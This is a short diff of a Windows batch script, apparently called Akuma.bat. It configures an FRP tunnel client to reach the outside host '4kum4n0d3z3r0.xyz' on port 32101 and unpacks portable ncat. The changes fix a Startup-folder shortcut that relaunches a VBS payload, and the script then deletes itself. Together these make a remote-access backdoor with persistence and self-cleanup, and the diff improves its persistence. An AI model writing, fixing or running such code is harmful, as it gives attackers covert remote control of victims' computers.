@@ -25,5 +25,7 @@ echo serverAddr = "4kum4n0d3z3r0.xyz" >> %homedrive%\Akuma\frp_0.52.1_windows_am
 echo serverPort = 32101 >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
 tar -xf ncat-portable-5.59BETA1.zip
 start %homedrive%\Akuma\Akuma.vbs
-echo y| del %userprofile%\Start Menu\Programs\Startup\Akuma.lnk
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
+echo y| del "%appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
+powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
+cd %~dp0
+del Akuma.bat
